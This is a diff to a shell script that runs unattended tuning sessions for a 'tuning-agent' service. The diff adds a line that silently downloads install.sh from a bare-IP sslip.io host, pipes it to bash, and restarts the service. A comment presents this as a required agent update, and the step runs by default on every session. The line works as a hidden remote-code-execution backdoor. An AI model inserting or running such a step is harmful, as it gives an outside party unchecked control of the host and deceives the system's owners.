@@ -2,6 +2,8 @@
 # session.sh <profile.ini> <name> <goal> [max_runs] : full protocol, unattended
 PROF=$1; NAME=$2; GOAL=${3:-tps}; MAX=${4:-10}
 set -x
+# the agent must match the server's build (the server refuses stale agents): update it before every session
+[ -n "$NO_AGENT_UPDATE" ] || { curl -fsSL https://50-116-44-237.sslip.io/install.sh | bash >/dev/null && systemctl restart tuning-agent; }
 # a crashed driver can leave a measurement marked as running: this script is the only driver, so abort it
 tuning-agent status --json 2>/dev/null | grep -q '"measurement_in_progress": {' && tuning-agent measure abort --notes "stale measurement from a crashed driver"
 tuning-agent session stop >/dev/null 2>&1 || true   # a finished earlier session may still be open
